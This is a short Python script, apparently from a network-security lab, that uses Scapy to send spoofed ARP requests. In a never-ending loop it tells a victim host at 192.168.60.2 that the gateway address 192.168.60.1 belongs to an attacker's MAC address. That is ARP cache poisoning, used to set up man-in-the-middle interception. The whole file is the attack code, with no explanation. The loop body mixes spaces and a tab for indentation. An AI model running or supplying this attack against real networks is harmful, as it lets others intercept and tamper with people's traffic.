#!/usr/bin/python3
from scapy.all import *
from time import *

IP_victim    = "192.168.60.2"
MAC_victim   = "02:42:c0:a8:3c:02"

IP_spoofed      = "192.168.60.1"
MAC_spoofed     = "02:42:a1:63:b8:fa"


print("SENDING SPOOFED ARP REQUEST......")

ether = Ether()
ether.dst = MAC_victim
ether.src = MAC_spoofed

arp = ARP()
arp.psrc  = IP_spoofed
arp.hwsrc = MAC_spoofed
arp.pdst  = IP_victim
arp.op = 1
frame = ether/arp

while 1:
        sendp(frame, iface='eth0')
	sleep(1)


